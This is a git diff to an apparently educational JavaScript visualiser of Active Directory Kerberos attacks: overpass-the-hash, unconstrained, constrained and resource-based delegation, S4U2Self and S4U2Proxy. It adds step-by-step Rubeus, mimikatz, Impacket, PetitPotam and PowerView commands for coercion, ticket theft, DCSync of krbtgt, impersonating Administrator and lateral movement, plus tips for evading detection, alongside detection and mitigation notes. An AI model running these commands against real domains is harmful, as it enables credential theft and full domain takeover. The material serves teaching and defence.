+					anim: { from: 'kdc', to: 'attacker', label: 'AS-REP + TGT', type: 'as-rep' },
+					tech: `<b>✅ WHY IT WORKS:</b><br>• NT hash is used to derive Kerberos key<br>• Pre-auth timestamp encrypted correctly<br>• KDC cannot distinguish from password<br><br><b>⚠️ OPSEC NOTES:</b><br>• Event 4768 logged on DC<br>• RC4 etype = 0x17 (suspicious!)<br>• Use AES256 to blend in<br>• Encryption type in event logs`
 				},
 				{
 					title: '4. Access Services',
 					desc: 'Use TGT to access any service. Appears as normal Kerberos authentication.',
 					active: 'attacker',
-					anim: { from: 'attacker', to: 'service', label: 'Kerberos Auth', type: 'ap-req' }
+					anim: { from: 'attacker', to: 'service', label: 'Kerberos Auth', type: 'ap-req' },
+					tech: `<b>🎯 USE THE TGT:</b><br><code># Verify ticket is loaded</code><br><code>klist</code><br><br><code># Request service ticket</code><br><code>Rubeus.exe asktgs /ticket:TGT /service:CIFS/server</code><br><br><code># Access resources directly</code><br><code>dir \\\\dc01\\c$</code><br><code>Enter-PSSession -ComputerName dc01</code><br><br><b>🐧 IMPACKET:</b><br><code>psexec.py -k -no-pass corp.local/admin@target</code><br><code>wmiexec.py -k -no-pass corp.local/admin@target</code>`
 				},
 				{
 					title: '5. Kerberos Access from Hash',
 					desc: 'Full Kerberos authentication without knowing password. Bypasses NTLM blocks.',
 					active: 'service',
+					tech: `<b>🛡️ DETECTION:</b><br>• Event 4768: Check encryption type<br>• RC4 (0x17) in modern env = suspicious<br>• Logon from unexpected source IP<br>• Time gaps in ticket usage patterns<br><br><b>🛡️ MITIGATIONS:</b><br>• Protected Users group (forces AES)<br>• Credential Guard (protects hashes)<br>• Disable RC4 in domain<br>• Monitor 4768 for encryption downgrade`,
 					warning: 'Mitigations: Protected Users, Credential Guard, AES-only (blocks RC4)'
 				}
 			]
@@ -1098,26 +1092,27 @@
 					title: 'What is Unconstrained Delegation?',
 					desc: 'Server can impersonate ANY user to ANY service. Stores user\'s TGT in memory!',
 					active: 'delegsrv',
-					tech: `<b>UAC Flag:</b> TRUSTED_FOR_DELEGATION (0x80000)<br><b>Find:</b> <code>(userAccountControl:1.2.840.113556.1.4.803:=524288)</code>`
+					tech: `<b>🔍 UAC FLAG:</b> TRUSTED_FOR_DELEGATION (0x80000 = 524288)<br><br><b>🎯 FIND VULNERABLE SYSTEMS:</b><br><code># PowerShell AD Module</code><br><code>Get-ADComputer -Filter {TrustedForDelegation -eq $true}</code><br><br><code># LDAP Filter</code><br><code>(userAccountControl:1.2.840.113556.1.4.803:=524288)</code><br><br><code># PowerView</code><br><code>Get-DomainComputer -Unconstrained</code><br><br><b>⚠️ NOTE:</b> All DCs have unconstrained delegation by default!`
 				},
 				{
 					title: '1. Compromise Delegation Server',
 					desc: 'Get admin access to server with unconstrained delegation enabled.',
 					active: 'attacker',
-					tech: `<b>Find targets:</b><br>• BloodHound: "Unconstrained Delegation"<br>• <code>Get-ADComputer -Filter {TrustedForDelegation -eq $true}</code>`
+					tech: `<b>🔍 FIND TARGETS (BloodHound):</b><br><code>MATCH (c:Computer {unconstraineddelegation:true})</code><br><code>RETURN c.name</code><br><br><b>🎯 COMMON SCENARIOS:</b><br>• Old file servers<br>• Print servers<br>• Application servers<br>• Poorly managed systems<br><br><b>📋 REQUIRED:</b><br>• Local admin on delegation server<br>• Target (DC/admin) to authenticate`
 				},
 				{
 					title: '2. Coerce DC Authentication',
 					desc: 'Force DC to authenticate to delegation server using PrinterBug, PetitPotam, etc.',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'victim', label: 'Coerce Auth', type: 'malicious' },
-					tech: `<b>Coercion:</b><br>• <code>SpoolSample.exe DC01 ATTACKER-SRV</code><br>• <code>PetitPotam.py ATTACKER-SRV DC01</code>`
+					tech: `<b>🎯 COERCION TECHNIQUES:</b><br><code># PrinterBug / SpoolSample</code><br><code>SpoolSample.exe DC01.corp.local ATTACKER-SRV.corp.local</code><br><br><code># Rubeus SpoolSample</code><br><code>Rubeus.exe monitor /interval:5 /filteruser:DC01$</code><br><br><code># PetitPotam (EFSRPC)</code><br><code>PetitPotam.py ATTACKER-SRV DC01</code><br><br><code># Coercer (multiple methods)</code><br><code>Coercer.py -u user -p pass -t DC01 -l ATTACKER-SRV</code><br><br><code># DFSCoerce</code><br><code>dfscoerce.py -u user -p pass ATTACKER-SRV DC01</code>`
 				},
 				{
 					title: '3. DC Authenticates with TGT',
 					desc: 'DC\'s machine account authenticates. TGT forwarded and cached on delegation server!',
 					active: 'victim',
 					anim: { from: 'victim', to: 'delegsrv', label: 'Auth + TGT!', type: 'ticket' },
+					tech: `<b>✅ WHY TGT IS FORWARDED:</b><br>• Unconstrained delegation flag set<br>• Client sends TGT in authenticator<br>• Server caches TGT for later use<br><br><b>⚠️ CRITICAL:</b><br>• DC machine account has DCSync rights!<br>• TGT valid for domain-level access`,
 					warning: 'DC machine account TGT is now on attacker-controlled server!'
 				},
 				{
@@ -1125,19 +1120,20 @@
 					desc: 'Dump the DC machine account TGT from LSASS.',
 					active: 'attacker',
 					anim: { from: 'delegsrv', to: 'attacker', label: 'Steal TGT', type: 'malicious' },
-					tech: `<code>Rubeus.exe monitor /interval:5</code><br><code>mimikatz # sekurlsa::tickets /export</code>`
+					tech: `<b>🎯 RUBEUS - Monitor & Capture:</b><br><code># Monitor for new TGTs</code><br><code>Rubeus.exe monitor /interval:5 /nowrap</code><br><br><code># Filter specific user</code><br><code>Rubeus.exe monitor /interval:5 /filteruser:DC01$</code><br><br><code># Dump all cached tickets</code><br><code>Rubeus.exe dump /nowrap</code><br><br><code># Triage tickets</code><br><code>Rubeus.exe triage</code><br><br><b>🔧 MIMIKATZ:</b><br><code>sekurlsa::tickets /export</code><br><code>kerberos::list /export</code>`
 				},
 				{
 					title: '5. DCSync Attack',
 					desc: 'Use DC\'s TGT to perform DCSync and extract all domain hashes.',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'dc', label: 'DCSync', type: 'malicious' },
-					tech: `<code>mimikatz # lsadump::dcsync /all</code><br>Get KRBTGT hash → Golden Ticket!`
+					tech: `<b>🎯 INJECT & DCSYNC:</b><br><code># Inject DC's TGT</code><br><code>Rubeus.exe ptt /ticket:DC01_TGT_BASE64</code><br><br><code># DCSync all accounts</code><br><code>mimikatz # lsadump::dcsync /all /csv</code><br><br><code># DCSync specific (KRBTGT)</code><br><code>mimikatz # lsadump::dcsync /user:krbtgt</code><br><br><b>🐧 IMPACKET:</b><br><code>export KRB5CCNAME=dc01.ccache</code><br><code>secretsdump.py -k -no-pass DC01.corp.local</code><br><br><b>🎯 GET KRBTGT:</b><br>• KRBTGT hash = Golden Ticket<br>• Persistent domain access`
 				},
 				{
 					title: '6. Domain Compromise!',
 					desc: 'All password hashes extracted. KRBTGT enables persistent access.',
 					active: 'dc',
+					tech: `<b>🛡️ DETECTION:</b><br>• Event 4624: Logon from unexpected host<br>• Replication events from non-DC<br>• Unusual TGT patterns<br>• Coercion attempts in logs<br><br><b>🛡️ MITIGATIONS:</b><br>• Remove unconstrained delegation<br>• Use constrained delegation or RBCD<br>• Protected Users for sensitive accounts<br>• Block Print Spooler on DCs<br>• Patch PetitPotam (KB5005413)<br>• Monitor for coercion attempts`,
 					warning: 'Mitigations: Remove unconstrained delegation, use constrained/RBCD, Protected Users for admins'
 				}
 			]
@@ -1156,50 +1152,56 @@
 					title: 'What is Constrained Delegation?',
 					desc: 'Service A can impersonate users to specific services (Service B) listed in msDS-AllowedToDelegateTo.',
 					active: 'service1',
-					tech: `<b>Attribute:</b> msDS-AllowedToDelegateTo<br>Example: <code>MSSQLSvc/sql01.corp.local</code><br>Only works with Protocol Transition if "Use any auth" enabled`
+					tech: `<b>📋 ATTRIBUTE:</b> msDS-AllowedToDelegateTo<br>Example: <code>MSSQLSvc/sql01.corp.local</code><br><br><b>🔄 PROTOCOL TRANSITION:</b><br>• "Use Kerberos only" - needs user TGT<br>• "Use any authentication protocol" - S4U2Self works!<br><br><b>🔍 FIND VULNERABLE:</b><br><code># PowerShell</code><br><code>Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo</code><br><code>Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo</code>`
 				},
 				{
 					title: '1. Compromise Delegating Service',
 					desc: 'Obtain hash of service account with constrained delegation configured.',
 					active: 'attacker',
-					tech: `<b>Find targets:</b><br><code>Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"}</code><br>Check "Trust this user for delegation" settings`
+					tech: `<b>🔍 FIND TARGETS:</b><br><code># PowerView</code><br><code>Get-DomainUser -TrustedToAuth</code><br><code>Get-DomainComputer -TrustedToAuth</code><br><br><code># BloodHound Cypher</code><br><code>MATCH (u:User {hasspn:true}) WHERE u.allowedtodelegate IS NOT NULL RETURN u</code><br><br><b>📋 REQUIRED:</b><br>• Service account password/hash<br>• OR compromise of server running service`
 				},
 				{
 					title: '2. S4U2Self - Get Ticket as Any User',
 					desc: 'Service requests ticket to ITSELF on behalf of any user (even those who never authenticated).',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'kdc', label: 'S4U2Self', type: 's4u' },
+					tech: `<b>🎯 RUBEUS - Full S4U Attack:</b><br><code># Complete S4U chain (S4U2Self + S4U2Proxy)</code><br><code>Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/server01.corp.local /ptt</code><br><br><code># With AES key (OPSEC)</code><br><code>Rubeus.exe s4u /user:svc_web /aes256:AESKEY /impersonateuser:Administrator /msdsspn:CIFS/server01 /ptt</code><br><br><code># Alternative service (abuse!)</code><br><code>Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:Admin /msdsspn:TIME/server01 /altservice:CIFS /ptt</code>`,
 					packet: { 'Service requests': 'Ticket to itself', 'For user': 'Administrator (any user!)', 'Result': 'Forwardable ticket for that user' }
 				},
 				{
 					title: '3. Receive Forwardable Ticket',
 					desc: 'KDC returns service ticket for target user TO the compromised service.',
 					active: 'kdc',
-					anim: { from: 'kdc', to: 'attacker', label: 'User Ticket', type: 'tgs-rep' }
+					anim: { from: 'kdc', to: 'attacker', label: 'User Ticket', type: 'tgs-rep' },
+					tech: `<b>✅ TICKET PROPERTIES:</b><br>• Ticket is to OUR service<br>• But for target user (Admin)<br>• Forwardable flag = TRUE<br>• PAC contains target user's groups<br><br><b>⚠️ KEY REQUIREMENT:</b><br>• TRUSTED_TO_AUTH_FOR_DELEGATION flag<br>• UAC: 0x1000000 (16777216)`
 				},
 				{
 					title: '4. S4U2Proxy - Delegate to Target',
 					desc: 'Use S4U2Self ticket to request ticket to allowed target service as the impersonated user.',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'kdc', label: 'S4U2Proxy', type: 's4u' },
+					tech: `<b>🎯 S4U2PROXY REQUEST:</b><br>• Present forwardable S4U2Self ticket<br>• Request ticket to target in msDS-AllowedToDelegateTo<br>• KDC checks: Is service allowed to delegate to target?<br><br><b>🐧 IMPACKET:</b><br><code># Get TGT first</code><br><code>getTGT.py -hashes :HASH corp.local/svc_web</code><br><br><code># S4U attack</code><br><code>getST.py -spn CIFS/server01.corp.local -impersonate Administrator -hashes :HASH corp.local/svc_web</code>`,
 					packet: { 'Present': 'S4U2Self ticket', 'Request ticket to': 'Allowed target service', 'As user': 'Administrator' }
 				},
 				{
 					title: '5. Receive Target Service Ticket',
 					desc: 'KDC validates delegation is allowed, returns service ticket to target.',
 					active: 'kdc',
-					anim: { from: 'kdc', to: 'attacker', label: 'Target Ticket', type: 'tgs-rep' }
+					anim: { from: 'kdc', to: 'attacker', label: 'Target Ticket', type: 'tgs-rep' },
+					tech: `<b>✅ KDC VALIDATION:</b><br>• Check msDS-AllowedToDelegateTo<br>• Verify target SPN is in list<br>• User not in Protected Users<br>• Account not sensitive for delegation<br><br><b>⚠️ SPN ABUSE:</b><br>• Service portion of SPN not validated!<br>• CIFS/server → HOST/server works<br>• Use /altservice flag in Rubeus`
 				},
 				{
 					title: '6. Access Target as Admin',
 					desc: 'Present ticket to target service. You\'re now the impersonated user!',
 					active: 'attacker',
-					anim: { from: 'attacker', to: 'service2', label: 'AP-REQ', type: 'ap-req' }
+					anim: { from: 'attacker', to: 'service2', label: 'AP-REQ', type: 'ap-req' },
+					tech: `<b>🎯 USE THE TICKET:</b><br><code># Verify loaded</code><br><code>klist</code><br><br><code># Access target</code><br><code>dir \\\\server01\\c$</code><br><code>Enter-PSSession -ComputerName server01</code><br><br><b>🐧 IMPACKET:</b><br><code>export KRB5CCNAME=Administrator.ccache</code><br><code>psexec.py -k -no-pass corp.local/Administrator@server01</code>`
 				},
 				{
 					title: '7. Target Service Compromised',
 					desc: 'Admin access to target service. Often leads to lateral movement or priv esc.',
 					active: 'service2',
+					tech: `<b>🛡️ DETECTION:</b><br>• Event 4769: S4U ticket requests<br>• Ticket requested for sensitive user<br>• Unusual delegation patterns<br><br><b>🛡️ MITIGATIONS:</b><br>• Protected Users group<br>• "Account is sensitive" flag<br>• Use RBCD instead<br>• Audit msDS-AllowedToDelegateTo<br>• Monitor S4U ticket requests`,
 					warning: 'Note: Service name in ticket can often be changed (SPN abuse)!'
 				}
 			]
@@ -1217,33 +1219,34 @@
 					title: 'What is S4U2Self?',
 					desc: 'Service-for-User-to-Self: A service can request a ticket to ITSELF on behalf of ANY user.',
 					active: 'attacker',
-					tech: `<b>Purpose:</b> Protocol transition - allow users who authenticated via non-Kerberos methods<br><b>Abuse:</b> Get ticket as any user without their password!`
+					tech: `<b>📋 PURPOSE:</b> Protocol transition - allow users who authenticated via non-Kerberos methods<br><br><b>🎯 ABUSE:</b> Get ticket as any user without their password!<br><br><b>✅ KEY INSIGHT:</b><br>• No proof of user auth needed<br>• Just claim "this user authenticated to me"<br>• KDC trusts the service account`
 				},
 				{
 					title: '1. Compromise Service Account',
 					desc: 'Need service account with SPN. Can be any service account you control.',
 					active: 'attacker',
-					tech: `<b>Requirements:</b><br>• Service account hash/password<br>• Account must have SPN<br>• Works even without delegation if ticket is not forwardable`
+					tech: `<b>📋 REQUIREMENTS:</b><br>• Service account hash/password<br>• Account must have SPN registered<br>• Works even without delegation configured!<br><br><b>🔍 GET SERVICE ACCOUNT:</b><br><code># Kerberoast to get hash</code><br><code>Rubeus.exe kerberoast /user:svc_sql</code><br><br><code># Or create machine account (has SPN)</code><br><code>New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString 'Pass123' -AsPlain -Force)</code>`
 				},
 				{
 					title: '2. S4U2Self Request',
 					desc: 'Request ticket to our own service on behalf of target user (e.g., Domain Admin).',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'kdc', label: 'S4U2Self', type: 's4u' },
-					packet: { 'PA-FOR-USER': 'Administrator@DOMAIN', 'sname': 'Our own SPN', 'Note': 'No proof of user needed!' },
-					tech: `<code>Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator</code>`
+					tech: `<b>🎯 RUBEUS - S4U2Self Only:</b><br><code># Just S4U2Self (no proxy)</code><br><code>Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /self</code><br><br><code># With TGT</code><br><code>Rubeus.exe s4u /ticket:TGT_BASE64 /impersonateuser:Admin /self</code><br><br><code># AES key (OPSEC)</code><br><code>Rubeus.exe s4u /user:svc /aes256:KEY /impersonateuser:Admin /self</code><br><br><b>🐧 IMPACKET:</b><br><code>getST.py -self -impersonate Administrator -hashes :HASH corp.local/svc_account</code>`,
+					packet: { 'PA-FOR-USER': 'Administrator@DOMAIN', 'sname': 'Our own SPN', 'Note': 'No proof of user needed!' }
 				},
 				{
 					title: '3. KDC Returns User Ticket',
 					desc: 'KDC creates ticket to our service as if the target user authenticated to us.',
 					active: 'kdc',
 					anim: { from: 'kdc', to: 'attacker', label: 'TGS (as Admin)', type: 'tgs-rep' },
-					tech: `<b>Ticket contains:</b><br>• PAC with target user's identity<br>• Groups and privileges of target user<br>• Forwardable flag based on account settings`
+					tech: `<b>✅ TICKET CONTAINS:</b><br>• PAC with target user's identity<br>• Groups and privileges of target user<br>• Forwardable flag based on service settings<br><br><b>⚠️ FORWARDABLE CHECK:</b><br>• TRUSTED_TO_AUTH_FOR_DELEGATION → Forwardable<br>• Without flag → Not forwardable (S4U2Proxy won't work)<br>• But can still use for local service access!`
 				},
 				{
 					title: '4. Ticket Obtained',
 					desc: 'We now have a valid service ticket as the target user to our service. Use for S4U2Proxy or modify SPN.',
 					active: 'attacker',
+					tech: `<b>🎯 USES FOR S4U2Self TICKET:</b><br>• Chain to S4U2Proxy (if forwardable)<br>• Modify service name in ticket<br>• Use with RBCD attack<br><br><b>⚠️ PROTECTED USERS:</b><br>• S4U2Self fails for Protected Users<br>• "Account is sensitive" also blocks<br><br><b>🛡️ DETECTION:</b><br>• Event 4769 with S4U flags<br>• Unusual service impersonating admin users`,
 					warning: 'If TRUSTED_TO_AUTH_FOR_DELEGATION set, ticket is forwardable → S4U2Proxy works'
 				}
 			]
@@ -1261,43 +1264,47 @@
 					title: 'What is S4U2Proxy?',
 					desc: 'Service-for-User-to-Proxy: Use a forwardable user ticket to request tickets to OTHER services as that user.',
 					active: 'attacker',
-					tech: `<b>Chain:</b> S4U2Self → get user ticket → S4U2Proxy → get ticket to target service<br><b>Requires:</b> Forwardable ticket + msDS-AllowedToDelegateTo`
+					tech: `<b>🔄 ATTACK CHAIN:</b><br>S4U2Self → Get user ticket → S4U2Proxy → Get ticket to target service<br><br><b>📋 REQUIREMENTS:</b><br>• Forwardable ticket for target user<br>• Target SPN in msDS-AllowedToDelegateTo (classic) OR<br>• Our account in target's msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)`
 				},
 				{
 					title: '1. Have Forwardable User Ticket',
 					desc: 'From S4U2Self or pass-the-ticket. Must be forwardable for S4U2Proxy.',
 					active: 'attacker',
-					tech: `<b>Sources:</b><br>• S4U2Self (if TRUSTED_TO_AUTH_FOR_DELEGATION)<br>• Stolen forwardable ticket<br>• Unconstrained delegation capture`
+					tech: `<b>🎯 TICKET SOURCES:</b><br>• S4U2Self (if TRUSTED_TO_AUTH_FOR_DELEGATION)<br>• Stolen forwardable ticket from PTT<br>• Unconstrained delegation capture<br>• RBCD (sets forwardable!)<br><br><b>⚠️ CHECK FORWARDABLE:</b><br><code># Describe ticket</code><br><code>Rubeus.exe describe /ticket:ticket.kirbi</code><br>Look for: flags: forwardable`
 				},
 				{
 					title: '2. S4U2Proxy Request',
 					desc: 'Present forwardable ticket, request ticket to target service in AllowedToDelegateTo.',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'kdc', label: 'S4U2Proxy', type: 's4u' },
+					tech: `<b>🎯 RUBEUS - Full S4U Chain:</b><br><code># Complete chain (S4U2Self + S4U2Proxy)</code><br><code>Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:Admin /msdsspn:CIFS/target.corp.local /ptt</code><br><br><code># With alternative service (SPN abuse)</code><br><code>Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:Admin /msdsspn:HTTP/target /altservice:CIFS,HOST,LDAP /ptt</code><br><br><code># Using existing ticket</code><br><code>Rubeus.exe s4u /ticket:S4U2SELF_TKT /msdsspn:CIFS/target /ptt</code><br><br><b>🐧 IMPACKET:</b><br><code>getST.py -spn CIFS/target.corp.local -impersonate Admin -hashes :HASH corp.local/svc_web</code>`,
 					packet: { 'additional-tickets': 'Forwardable S4U2Self ticket', 'sname': 'CIFS/target.domain.com', 'Must be in': 'msDS-AllowedToDelegateTo' }
 				},
 				{
 					title: '3. KDC Validates Delegation',
 					desc: 'KDC checks: Is target SPN in AllowedToDelegateTo? Is ticket forwardable? Is user allowed?',
 					active: 'kdc',
-					tech: `<b>Checks:</b><br>• Target in AllowedToDelegateTo ✓<br>• Ticket is forwardable ✓<br>• User not in Protected Users ✓`
+					tech: `<b>✅ KDC VALIDATION CHECKS:</b><br>• Target SPN in AllowedToDelegateTo ✓<br>• Ticket is forwardable ✓<br>• User not in Protected Users ✓<br>• User not "sensitive for delegation" ✓<br><br><b>⚠️ BYPASS WITH RBCD:</b><br>• RBCD ignores msDS-AllowedToDelegateTo<br>• Only checks msDS-AllowedToActOnBehalfOfOtherIdentity on target`
 				},
 				{
 					title: '4. Receive Target Service Ticket',
 					desc: 'KDC issues ticket to target service as the impersonated user.',
 					active: 'kdc',
-					anim: { from: 'kdc', to: 'attacker', label: 'Service Ticket', type: 'tgs-rep' }
+					anim: { from: 'kdc', to: 'attacker', label: 'Service Ticket', type: 'tgs-rep' },
+					tech: `<b>✅ TICKET RECEIVED:</b><br>• Valid service ticket to target<br>• As impersonated user (Admin)<br>• With target user's PAC/groups<br><br><b>⚠️ SPN ABUSE:</b><br>• Service portion often not validated<br>• HTTP → CIFS → HOST all work<br>• Use /altservice for multiple tickets`
 				},
 				{
 					title: '5. Access Target Service',
 					desc: 'Present ticket to target. We\'re authenticated as the impersonated user!',
 					active: 'attacker',
-					anim: { from: 'attacker', to: 'service', label: 'AP-REQ', type: 'ap-req' }
+					anim: { from: 'attacker', to: 'service', label: 'AP-REQ', type: 'ap-req' },
+					tech: `<b>🎯 USE THE TICKET:</b><br><code># Access file shares (CIFS)</code><br><code>dir \\\\target\\c$</code><br><br><code># PSRemoting (HOST/WSMAN)</code><br><code>Enter-PSSession -ComputerName target</code><br><br><code># WMI (HOST)</code><br><code>wmic /node:target process list</code><br><br><b>🐧 IMPACKET:</b><br><code>export KRB5CCNAME=Admin.ccache</code><br><code>psexec.py -k -no-pass corp.local/Admin@target</code>`
 				},
 				{
 					title: '6. Impersonation Complete',
 					desc: 'Full access as target user to the delegated service.',
 					active: 'service',
+					tech: `<b>🛡️ DETECTION:</b><br>• Event 4769 with S4U flags<br>• Service account requesting tickets for admins<br>• Unusual SPN access patterns<br><br><b>🛡️ MITIGATIONS:</b><br>• Protected Users group<br>• "Account is sensitive" flag<br>• Audit delegation permissions<br>• Use RBCD with strict controls<br>• Monitor S4U request patterns`,
 					warning: 'SPN in ticket can sometimes be modified to access other services (same account)!'
 				}
 			]
@@ -1316,52 +1323,54 @@
 					title: 'What is RBCD?',
 					desc: 'Resource decides who can delegate TO it (opposite of constrained). Configured via msDS-AllowedToActOnBehalfOfOtherIdentity.',
 					active: 'target',
-					tech: `<b>Classic Constrained:</b> Source defines where it CAN delegate<br><b>RBCD:</b> Target defines who CAN delegate to it<br>Target\'s attribute, not source\'s!`
+					tech: `<b>🆚 CLASSIC vs RBCD:</b><br>• <b>Classic Constrained:</b> Source defines where it CAN delegate<br>• <b>RBCD:</b> Target defines who CAN delegate to it<br><br><b>📋 ATTRIBUTE:</b> msDS-AllowedToActOnBehalfOfOtherIdentity<br>• Stored on TARGET (not source)<br>• Contains SIDs of accounts that can delegate<br>• Available since Windows Server 2012`
 				},
 				{
 					title: '1. Check Permissions',
 					desc: 'Need GenericWrite/GenericAll on target computer object to modify its msDS-AllowedToActOnBehalfOfOtherIdentity.',
 					active: 'attacker',
-					tech: `<b>Find targets:</b><br>• BloodHound: GenericWrite edges to computers<br>• Check if you can create computer accounts (default: 10)`
+					tech: `<b>🔍 FIND TARGETS (BloodHound):</b><br><code>MATCH p=(u)-[:GenericWrite|GenericAll|WriteProperty]->(c:Computer)</code><br><code>RETURN p</code><br><br><b>🔍 CHECK MACHINE ACCOUNT QUOTA:</b><br><code># Default = 10 machine accounts per user</code><br><code>Get-ADObject -Identity "DC=corp,DC=local" -Properties ms-DS-MachineAccountQuota</code><br><br><b>📋 REQUIRED PERMISSIONS:</b><br>• GenericWrite on target computer<br>• GenericAll on target computer<br>• Write to msDS-AllowedToActOnBehalfOfOtherIdentity`
 				},
 				{
 					title: '2. Create/Control Account with SPN',
 					desc: 'Need an account with SPN. Create machine account or use existing controlled account.',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'controlled', label: 'Control', type: 'ticket' },
-					tech: `<b>Create machine account:</b><br><code>New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString 'Pass123' -AsPlain -Force)</code>`
+					tech: `<b>🎯 CREATE MACHINE ACCOUNT:</b><br><code># PowerMad</code><br><code>Import-Module Powermad.ps1</code><br><code>New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString 'Pass123!' -AsPlain -Force)</code><br><br><code># Impacket</code><br><code>addcomputer.py -computer-name FAKE01 -computer-pass 'Pass123!' corp.local/user:pass</code><br><br><b>🔑 GET HASH:</b><br><code># Calculate NT hash of password</code><br><code>python -c "import hashlib; print(hashlib.new('md4', 'Pass123!'.encode('utf-16le')).hexdigest())"</code><br><br><code># Or use Rubeus</code><br><code>Rubeus.exe hash /password:Pass123!</code>`
 				},
 				{
 					title: '3. Configure RBCD on Target',
 					desc: 'Set msDS-AllowedToActOnBehalfOfOtherIdentity on target to allow our controlled account.',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'target', label: 'Set RBCD', type: 'malicious' },
-					tech: `<code>Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount FAKE01$</code><br>or PowerView: <code>Set-DomainObject</code>`
+					tech: `<b>🎯 SET RBCD - PowerShell AD Module:</b><br><code>Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount FAKE01$</code><br><br><b>🎯 PowerView:</b><br><code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-xxx-xxx-xxx-1337)"</code><br><code>$bytes = New-Object byte[] ($SD.BinaryLength)</code><br><code>$SD.GetBinaryForm($bytes,0)</code><br><code>Set-DomainObject TARGET -Set @{'msds-allowedtoactonbehalfofotheridentity'=$bytes}</code><br><br><b>🐧 IMPACKET:</b><br><code>rbcd.py -delegate-to TARGET$ -delegate-from FAKE01$ -action write corp.local/user:pass</code>`
 				},
 				{
 					title: '4. S4U2Self from Controlled Account',
 					desc: 'Request ticket to our controlled account as target user (e.g., Admin).',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'kdc', label: 'S4U2Self', type: 's4u' },
-					tech: `<code>Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/TARGET /ptt</code>`
+					tech: `<b>🎯 RUBEUS - Full RBCD Attack:</b><br><code># Complete S4U chain with RBCD</code><br><code>Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/TARGET.corp.local /ptt</code><br><br><code># With AES key (OPSEC)</code><br><code>Rubeus.exe s4u /user:FAKE01$ /aes256:AESKEY /impersonateuser:Admin /msdsspn:CIFS/TARGET /ptt</code><br><br><code># Alternative services (get multiple)</code><br><code>Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:Admin /msdsspn:CIFS/TARGET /altservice:HOST,LDAP /ptt</code><br><br><b>🐧 IMPACKET:</b><br><code>getST.py -spn CIFS/TARGET.corp.local -impersonate Administrator -hashes :HASH corp.local/FAKE01$</code>`
 				},
 				{
 					title: '5. S4U2Proxy to Target',
 					desc: 'Use S4U2Self ticket to get ticket to target service. KDC checks RBCD attribute.',
 					active: 'kdc',
 					anim: { from: 'kdc', to: 'attacker', label: 'Target Ticket', type: 'tgs-rep' },
-					tech: `<b>KDC checks:</b><br>Is FAKE01$ in TARGET's msDS-AllowedToActOnBehalfOfOtherIdentity? → Yes → Issue ticket`
+					tech: `<b>✅ KDC CHECKS:</b><br>• Is FAKE01$ in TARGET's msDS-AllowedToActOnBehalfOfOtherIdentity?<br>• → Yes → Issue forwardable ticket!<br><br><b>⚠️ KEY DIFFERENCE:</b><br>• RBCD makes S4U2Self ticket forwardable!<br>• No TRUSTED_TO_AUTH_FOR_DELEGATION needed<br>• This is why RBCD is so powerful`
 				},
 				{
 					title: '6. Access Target as Admin',
 					desc: 'Present ticket. We\'re now Domain Admin on the target computer!',
 					active: 'attacker',
-					anim: { from: 'attacker', to: 'target', label: 'AP-REQ', type: 'ap-req' }
+					anim: { from: 'attacker', to: 'target', label: 'AP-REQ', type: 'ap-req' },
+					tech: `<b>🎯 USE THE TICKET:</b><br><code># Verify ticket loaded</code><br><code>klist</code><br><br><code># Access target (CIFS)</code><br><code>dir \\\\TARGET\\c$</code><br><br><code># PSRemoting (need HOST SPN)</code><br><code>Enter-PSSession -ComputerName TARGET</code><br><br><b>🐧 IMPACKET:</b><br><code>export KRB5CCNAME=Administrator.ccache</code><br><code>psexec.py -k -no-pass corp.local/Administrator@TARGET</code><br><code>wmiexec.py -k -no-pass corp.local/Administrator@TARGET</code>`
 				},
 				{
 					title: '7. Target Compromised!',
 					desc: 'Local admin on target. If target is DC → domain compromise.',
 					active: 'target',
+					tech: `<b>🛡️ DETECTION:</b><br>• Event 4662: msDS-AllowedToActOnBehalfOfOtherIdentity modified<br>• Event 4769: S4U ticket requests<br>• New machine accounts created<br>• Unusual RBCD configurations<br><br><b>🛡️ MITIGATIONS:</b><br>• Set MachineAccountQuota to 0<br>• Audit GenericWrite ACLs on computers<br>• Monitor RBCD attribute changes<br>• Protected Users (blocks impersonation)<br>• Use PAM/tiered admin model`,
 					warning: 'Mitigations: Audit GenericWrite ACLs, Protected Users, monitor RBCD changes'
 				}
 			]
